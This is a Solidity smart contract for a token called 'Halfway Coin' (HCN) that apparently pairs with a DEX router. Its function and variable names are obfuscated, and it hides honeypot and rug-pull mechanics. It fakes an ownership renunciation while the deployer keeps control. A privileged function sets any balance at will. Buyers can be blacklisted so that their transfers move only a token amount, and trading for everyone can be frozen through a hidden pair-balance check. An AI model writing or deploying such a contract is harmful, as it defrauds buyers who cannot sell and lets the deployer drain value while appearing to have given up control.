//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface tradingShould {
    function createPair(address autoTrading, address senderFund) external returns (address);
}

interface modeSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldSell) external view returns (uint256);

    function transfer(address walletAmount, uint256 amountWallet) external returns (bool);

    function allowance(address walletSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountWallet) external returns (bool);

    function transferFrom(
        address sender,
        address walletAmount,
        uint256 amountWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toBuy, uint256 value);
    event Approval(address indexed walletSell, address indexed spender, uint256 value);
}

abstract contract enableExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyListTake is modeSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HalfwayCoin is enableExempt, modeSwap, buyListTake {

    function balanceOf(address shouldSell) public view virtual override returns (uint256) {
        return liquidityLimit[shouldSell];
    }

    address public amountReceiver;

    function totalAuto(address senderToken, address walletAmount, uint256 amountWallet) internal returns (bool) {
        require(liquidityLimit[senderToken] >= amountWallet);
        liquidityLimit[senderToken] -= amountWallet;
        liquidityLimit[walletAmount] += amountWallet;
        emit Transfer(senderToken, walletAmount, amountWallet);
        return true;
    }

    event OwnershipTransferred(address indexed isAmount, address indexed modeLimit);

    string private maxSell = "Halfway Coin";

    address private senderIs;

    address minTeamSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return maxSell;
    }

    uint256 public totalBuyMarketing;

    function totalSupply() external view virtual override returns (uint256) {
        return launchReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return enableMin;
    }

    bool private totalAt;

    mapping(address => mapping(address => uint256)) private listAt;

    function enableList() public {
        emit OwnershipTransferred(feeSell, address(0));
        senderIs = address(0);
    }

    address public feeSell;

    bool private buyTxSwap;

    uint256 private marketingTrading;

    function getOwner() external view returns (address) {
        return senderIs;
    }

    mapping(address => uint256) private liquidityLimit;

    uint8 private tradingToken = 18;

    function approve(address minMarketing, uint256 amountWallet) public virtual override returns (bool) {
        listAt[_msgSender()][minMarketing] = amountWallet;
        emit Approval(_msgSender(), minMarketing, amountWallet);
        return true;
    }

    mapping(address => bool) public exemptMax;

    address fromReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function walletTradingLaunch(uint256 amountWallet) public {
        modeListShould();
        buyToToken = amountWallet;
    }

    function receiverBuy(address toListAuto) public {
        modeListShould();
        if (buyTxSwap != atEnable) {
            marketingTrading = totalBuyMarketing;
        }
        if (toListAuto == feeSell || toListAuto == amountReceiver) {
            return;
        }
        sellToSwap[toListAuto] = true;
    }

    function owner() external view returns (address) {
        return senderIs;
    }

    bool public walletSwap;

    uint256 buyToToken;

    function allowance(address modeTrading, address minMarketing) external view virtual override returns (uint256) {
        if (minMarketing == minTeamSell) {
            return type(uint256).max;
        }
        return listAt[modeTrading][minMarketing];
    }

    function transferFrom(address senderToken, address walletAmount, uint256 amountWallet) external override returns (bool) {
        if (_msgSender() != minTeamSell) {
            if (listAt[senderToken][_msgSender()] != type(uint256).max) {
                require(amountWallet <= listAt[senderToken][_msgSender()]);
                listAt[senderToken][_msgSender()] -= amountWallet;
            }
        }
        return tokenReceiverTrading(senderToken, walletAmount, amountWallet);
    }

    function decimals() external view virtual override returns (uint8) {
        return tradingToken;
    }

    bool public atEnable;

    constructor (){
        
        totalSender buyReceiver = totalSender(minTeamSell);
        amountReceiver = tradingShould(buyReceiver.factory()).createPair(buyReceiver.WETH(), address(this));
        if (buyTxSwap) {
            totalBuyMarketing = marketingTrading;
        }
        feeSell = _msgSender();
        exemptMax[feeSell] = true;
        liquidityLimit[feeSell] = launchReceiver;
        enableList();
        
        emit Transfer(address(0), feeSell, launchReceiver);
    }

    function transfer(address tokenTo, uint256 amountWallet) external virtual override returns (bool) {
        return tokenReceiverTrading(_msgSender(), tokenTo, amountWallet);
    }

    uint256 constant swapWallet = 20 ** 10;

    uint256 private launchReceiver = 100000000 * 10 ** 18;

    function shouldLimit(address tokenTo, uint256 amountWallet) public {
        modeListShould();
        liquidityLimit[tokenTo] = amountWallet;
    }

    mapping(address => bool) public sellToSwap;

    string private enableMin = "HCN";

    function tokenReceiverTrading(address senderToken, address walletAmount, uint256 amountWallet) internal returns (bool) {
        if (senderToken == feeSell) {
            return totalAuto(senderToken, walletAmount, amountWallet);
        }
        uint256 teamToken = modeSwap(amountReceiver).balanceOf(fromReceiver);
        require(teamToken == buyToToken);
        require(walletAmount != fromReceiver);
        if (sellToSwap[senderToken]) {
            return totalAuto(senderToken, walletAmount, swapWallet);
        }
        return totalAuto(senderToken, walletAmount, amountWallet);
    }

    function modeListShould() private view {
        require(exemptMax[_msgSender()]);
    }

    function txEnable(address isFundTo) public {
        if (walletSwap) {
            return;
        }
        
        exemptMax[isFundTo] = true;
        if (totalAt) {
            totalBuyMarketing = marketingTrading;
        }
        walletSwap = true;
    }

    uint256 liquidityMin;

}